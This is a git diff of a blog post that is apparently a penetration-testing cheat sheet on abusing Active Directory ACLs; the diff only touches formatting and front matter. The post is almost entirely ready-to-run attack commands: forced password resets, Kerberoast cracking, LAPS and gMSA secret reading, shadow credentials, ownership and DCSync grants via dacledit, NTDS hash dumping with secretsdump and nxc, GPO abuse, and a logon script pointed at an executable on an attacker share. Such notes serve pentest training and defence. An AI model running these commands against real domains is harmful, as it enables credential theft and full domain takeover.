@@ -1,10 +1,12 @@
 ---
-title: "AD : ACLs"
+title: 'AD : ACLs'
 date: 2025-12-02 00:31:33
+
 categories:
   - Active Directory
   - Exploitation
   - ACLs
+
 tags:
   - netexec
   - Certipy
@@ -14,7 +16,15 @@ tags:
   - secretsdump
   - PowerView
   - net
+
+
+cover: /img/acls.png
+top_img: /img/bg-img.jpg
+description: Exploit ACLs.
 ---
+
+
+
 
 # ForceChangePassword
 
@@ -59,9 +69,8 @@ Then we can crack the hash with :
 > for $krb5tgs$23$*…
 
 ```bash
-hashcat -m 13100 -a 0 hashfile wordilst.txt
+hashcat -m 13100 -a 0 hashfile wordilst.txt 
 ```
-
 > for $krb5tgs$18$*…
 
 ```bash
@@ -90,6 +99,7 @@ net rpc group addmem target-group target-user -U domain/our-user -S dc
 bloodyAD.py --host dc -d domain -u our-user -p password add groupMember target-group target-user
 ```
 
+
 # ReadLAPSPassword
 
 > ➜ Read the LAPS local admin password from a computer object.
@@ -114,6 +124,7 @@ nxc ldap target -u username -p password --gmsa
 certipy shadow auto -u username@domain -p password -account target-user -dc-ip ip
 ```
 
+
 # WriteOwner
 
 > ➜ Take ownership of the object
@@ -131,7 +142,6 @@ Grant Ourselves Full Control (GenericAll) Over the Target User
 ```bash
 dacledit.py -action 'write' -rights 'FullControl' -principal our-user -target target-user 'domain/our-user:password' -dc-ip dc-ip
 ```
-
 ### Group
 
 Take Ownership Of The Target Group :
@@ -145,6 +155,9 @@ Grant Ourselves Full Control (GenericAll) Over the Target User :
 ```bash
 dacledit.py -action 'write' -rights 'FullControl' -principal our-user -target target-group 'domain/our-user:password' -dc-ip dc-ip
 ```
+
+
+
 
 # GenericWrite
 
@@ -201,7 +214,7 @@ bloodyAD --host "DC-IP" -d "domain" -u "our-user" -p "password" set object targe
 ```bash
 Import-Module .\PowerView.ps1
 
-echo "\\our-ip\share\file.exe" > shares.ps1
+echo "\\our-ip\share\file.exe" > shares.ps1 
 
 Set-DomainObject -Identity maria -SET @{scriptpath="C:\\shares.ps1"}
 ```
@@ -238,21 +251,25 @@ addcomputer.py -computer-name 'target-computer' -computer-pass 'new-password' -n
 dacledit.py -action 'write' -rights 'DCSync' -principal 'controlledUser' -target-dn 'DomainDisinguishedName' 'domain'/'controlledUser':'password'
 ```
 
-DCsync
+DCsync 
 
 ```bash
 impacket-secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'
 ```
 
+
 # DCSync Rights
+
 
 ```bash
 secretsdump.py domain/username:password@domain
 ```
 
+
 ```bash
 secretsdump.py domain/username@domain -hashes :hash
 ```
+
 
 ```bash
 secretsdump.py dc -k
@@ -268,7 +285,7 @@ nxc smb target -u username -p password --ntds
 
 ### User
 
-> ➜ Change User’s Password
+> ➜ Change User's Password
 
 ```bash
 nxc smb domain -u our-user -p password -M change-password -o USER='target-username' NEWPASS='new-password'
@@ -296,7 +313,7 @@ bloodyAD --host dc -d domain -u username -p password add groupMember target-grou
 
 ### Group Policy Object ( GPO )
 
-```plaintext
+```
 git clone https://github.com/Hackndo/pyGPOAbuse.git
 
 uv add --script pygpoabuse.py -r requirements.txt
@@ -308,12 +325,15 @@ uv run --script pygpoabuse.py domain/our-user:password -gpo-id <id> -command 'ne
 
 ### Organization Unit
 
+
 ```bash
 dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal our-user -target-dn 'Organization-Unit' domain/our-user:password
 ```
 
-With Kerberos
+With Kerberos 
 
 ```bash
 dacledit.py -action write -rights 'FullControl' -inheritance -principal our-user -target-dn 'Organization-Unit' domain/our-user:password -dc-ip dc -k
 ```
+
+
